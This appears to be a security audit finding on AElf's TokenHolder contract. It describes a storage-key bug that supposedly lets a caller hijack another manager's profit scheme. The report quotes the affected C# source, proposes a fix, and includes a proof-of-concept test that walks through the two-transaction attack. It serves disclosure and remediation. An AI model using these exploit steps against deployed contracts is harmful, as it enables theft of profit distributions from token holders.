# Audit Report

## Title
State Corruption and Authorization Bypass in TokenHolder Profit Scheme Management

## Summary
The `UpdateTokenHolderProfitScheme` function contains a critical state corruption bug where it writes scheme data to `State.TokenHolderProfitSchemes[Context.Sender]` instead of `State.TokenHolderProfitSchemes[manager]`. This allows attackers to corrupt their own scheme entry with another manager's scheme data, then exploit the corrupted scheme_id to perform unauthorized beneficiary modifications on victim profit schemes through the TokenHolder contract's elevated privileges in the Profit contract.

## Finding Description

The root cause is in the `UpdateTokenHolderProfitScheme` function where scheme updates are written to the wrong state mapping key. The function receives a `manager` parameter and queries the Profit contract for that manager's scheme information, but then writes the updated scheme to `Context.Sender`'s storage slot instead of the `manager`'s slot. [1](#0-0) 

This function is called from `GetValidScheme` which accepts a `manager` parameter that can differ from `Context.Sender`: [2](#0-1) 

Multiple public entry points call `GetValidScheme` with user-controlled manager addresses. The most critical is `ContributeProfits` which has no authorization check preventing arbitrary scheme_manager specification: [3](#0-2) 

After corrupting their state entry, an attacker can call `AddBeneficiary` which retrieves the attacker's corrupted scheme (containing the victim's SchemeId) and makes privileged calls to the Profit contract: [4](#0-3) 

The Profit contract's authorization checks allow the TokenHolder contract as a trusted system contract alongside the scheme manager: [5](#0-4) 

The same authorization pattern exists for `RemoveBeneficiary`: [6](#0-5) 

## Impact Explanation

This vulnerability enables critical authorization bypass and fund theft:

**Authorization Bypass:** The attacker exploits the TokenHolder contract's elevated privileges to manipulate any profit scheme. The Profit contract trusts calls from the TokenHolder system contract, but the state corruption bug allows attackers to trick TokenHolder into operating on victim schemes.

**Fund Theft Vectors:**
1. **Direct Profit Theft:** Attacker adds themselves as beneficiary with arbitrary shares to victim's profit scheme, receiving a portion of all future profit distributions
2. **Share Dilution:** Attacker can remove legitimate beneficiaries, increasing their own profit share
3. **Complete Takeover:** By manipulating beneficiary lists, attacker redirects profit flows intended for legitimate token holders

**State Integrity Violation:** The victim's `TokenHolderProfitScheme` is never updated correctly, while the attacker's scheme contains incorrect configuration (wrong symbol, lock periods, distribution thresholds). Users who registered under schemes that later get corrupted cannot withdraw correctly due to symbol mismatches: [7](#0-6) 

**Affected Parties:**
- Token holders who rely on profit schemes for dividend distribution
- Legitimate beneficiaries who lose their profit allocations
- Users who locked tokens under schemes that become corrupted

## Likelihood Explanation

**Reachability:** The vulnerability is directly exploitable through the public `ContributeProfits` method. No special permissions are required to call this method with an arbitrary `SchemeManager` address.

**Attack Complexity:** LOW - The attack requires only two transactions:
1. Call `ContributeProfits(victim_address, amount, symbol)` to corrupt the attacker's scheme state with victim's data
2. Call `AddBeneficiary(attacker_address, shares)` to add themselves to the victim's profit scheme

**Preconditions:** 
- Victim must have created a TokenHolder profit scheme (common use case for token dividend distribution)
- Attacker needs token approval for ContributeProfits (but corruption happens before token transfer, so even if transfer fails, state is corrupted)

**Economic Incentive:** 
- Attack cost: Minimal (only gas fees)
- Potential gain: Share of all future profit distributions to high-value schemes
- Risk/reward ratio is extremely favorable for attackers

**Detection Difficulty:** The state corruption is silent with no events emitted. Unauthorized beneficiary modifications appear as legitimate TokenHolder contract interactions with the Profit contract, making them difficult to distinguish from normal operations in transaction logs.

## Recommendation

Fix the state write operation in `UpdateTokenHolderProfitScheme` to write to the correct manager's storage slot:

```csharp
private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
    bool updateSchemePeriod)
{
    if (scheme.SchemeId != null && !updateSchemePeriod) return;
    var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
    {
        Manager = manager
    }).SchemeIds.FirstOrDefault();
    Assert(originSchemeId != null, "Origin scheme not found.");
    var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
    scheme.SchemeId = originScheme.SchemeId;
    scheme.Period = originScheme.CurrentPeriod;
    State.TokenHolderProfitSchemes[manager] = scheme;  // Fixed: Use manager instead of Context.Sender
}
```

Additionally, consider adding authorization checks to methods that call `GetValidScheme` with user-provided manager addresses, particularly `ContributeProfits`, to ensure callers have appropriate permissions.

## Proof of Concept

```csharp
[Fact]
public async Task StateCorruptionAndAuthorizationBypass_Attack()
{
    // Setup: Victim creates a profit scheme
    var victimStub = GetTokenHolderContractTester(UserKeyPairs[0]);
    await victimStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 100
    });
    
    var victimAddress = UserAddresses[0];
    
    // Initialize victim's scheme by contributing profits
    await victimStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = victimAddress,
        Symbol = "ELF",
        Amount = 1000
    });
    
    var victimScheme = await victimStub.GetScheme.CallAsync(victimAddress);
    var victimSchemeId = victimScheme.SchemeId;
    
    // Add legitimate beneficiary to victim's scheme
    await victimStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = UserAddresses[1],
        Shares = 100
    });
    
    // Verify victim scheme state
    var victimProfitScheme = await ProfitContractStub.GetScheme.CallAsync(victimSchemeId);
    victimProfitScheme.TotalShares.ShouldBe(100);
    
    // Attack: Attacker corrupts their state by calling ContributeProfits with victim's address
    var attackerStub = GetTokenHolderContractTester(UserKeyPairs[2]);
    var attackerAddress = UserAddresses[2];
    
    // Attacker calls ContributeProfits with victim's address as SchemeManager
    await attackerStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = victimAddress,  // Using victim's address
        Symbol = "ELF",
        Amount = 1
    });
    
    // Verify state corruption: attacker's scheme now contains victim's SchemeId
    var attackerScheme = await attackerStub.GetScheme.CallAsync(attackerAddress);
    attackerScheme.SchemeId.ShouldBe(victimSchemeId);  // Attacker's state is corrupted with victim's data
    
    // Exploit: Attacker adds themselves as beneficiary using corrupted scheme
    await attackerStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = attackerAddress,
        Shares = 900  // Attacker gains large share
    });
    
    // Verify authorization bypass: attacker successfully added to victim's profit scheme
    var finalProfitScheme = await ProfitContractStub.GetScheme.CallAsync(victimSchemeId);
    finalProfitScheme.TotalShares.ShouldBe(1000);  // 100 (legitimate) + 900 (attacker)
    
    var attackerProfitDetails = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = victimSchemeId,
        Beneficiary = attackerAddress
    });
    attackerProfitDetails.Details[0].Shares.ShouldBe(900);  // Attacker has 90% of shares
    
    // Impact: Attacker will receive 90% of future profit distributions intended for victim's scheme
}
```

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L37-68)
```csharp
    public override Empty AddBeneficiary(AddTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);
        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
        var shares = input.Shares;
        if (detail.Details.Any())
        {
            // Only keep one detail.

            State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
            {
                SchemeId = scheme.SchemeId,
                Beneficiary = input.Beneficiary
            });
            shares.Add(detail.Details.Single().Shares);
        }

        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = input.Beneficiary,
                Shares = shares
            }
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L100-129)
```csharp
    public override Empty ContributeProfits(ContributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager);
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = Context.Sender,
            To = Context.Self,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.TokenContract.Approve.Send(new ApproveInput
        {
            Spender = State.ProfitContract.Value,
            Symbol = input.Symbol,
            Amount = input.Amount
        });

        State.ProfitContract.ContributeProfits.Send(new Profit.ContributeProfitsInput
        {
            SchemeId = scheme.SchemeId,
            Symbol = input.Symbol,
            Amount = input.Amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L211-244)
```csharp
    public override Empty Withdraw(Address input)
    {
        var scheme = GetValidScheme(input);
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        var lockId = State.LockIds[input][Context.Sender];
        Assert(lockId != null, "Sender didn't register for profits.");
        var amount = State.TokenContract.GetLockedAmount.Call(new GetLockedAmountInput
        {
            Address = Context.Sender,
            LockId = lockId,
            Symbol = scheme.Symbol
        }).Amount;

        Assert(State.LockTimestamp[lockId].AddMinutes(scheme.MinimumLockMinutes) < Context.CurrentBlockTime,
            "Cannot withdraw.");

        State.TokenContract.Unlock.Send(new UnlockInput
        {
            Address = Context.Sender,
            LockId = lockId,
            Amount = amount,
            Symbol = scheme.Symbol
        });

        State.LockIds[input].Remove(Context.Sender);
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = Context.Sender
        });
        return new Empty();
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L278-284)
```csharp
    private TokenHolderProfitScheme GetValidScheme(Address manager, bool updateSchemePeriod = false)
    {
        var scheme = State.TokenHolderProfitSchemes[manager];
        Assert(scheme != null, "Token holder profit scheme not found.");
        UpdateTokenHolderProfitScheme(ref scheme, manager, updateSchemePeriod);
        return scheme;
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L286-299)
```csharp
    private void UpdateTokenHolderProfitScheme(ref TokenHolderProfitScheme scheme, Address manager,
        bool updateSchemePeriod)
    {
        if (scheme.SchemeId != null && !updateSchemePeriod) return;
        var originSchemeId = State.ProfitContract.GetManagingSchemeIds.Call(new GetManagingSchemeIdsInput
        {
            Manager = manager
        }).SchemeIds.FirstOrDefault();
        Assert(originSchemeId != null, "Origin scheme not found.");
        var originScheme = State.ProfitContract.GetScheme.Call(originSchemeId);
        scheme.SchemeId = originScheme.SchemeId;
        scheme.Period = originScheme.CurrentPeriod;
        State.TokenHolderProfitSchemes[Context.Sender] = scheme;
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L158-175)
```csharp
    public override Empty AddBeneficiary(AddBeneficiaryInput input)
    {
        AssertValidInput(input);
        if (input.EndPeriod == 0)
            // Which means this profit Beneficiary will never expired unless removed.
            input.EndPeriod = long.MaxValue;

        var schemeId = input.SchemeId;
        var scheme = State.SchemeInfos[schemeId];

        Assert(scheme != null, "Scheme not found.");

        // ReSharper disable once PossibleNullReferenceException
        Assert(
            Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager can add beneficiary.");

```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L224-240)
```csharp
    public override Empty RemoveBeneficiary(RemoveBeneficiaryInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        Assert(input.Beneficiary != null, "Invalid Beneficiary address.");

        var scheme = State.SchemeInfos[input.SchemeId];

        Assert(scheme != null, "Scheme not found.");

        var currentDetail = State.ProfitDetailsMap[input.SchemeId][input.Beneficiary];

        if (scheme == null || currentDetail == null) return new Empty();

        Assert(Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager or token holder contract can add beneficiary.");

```
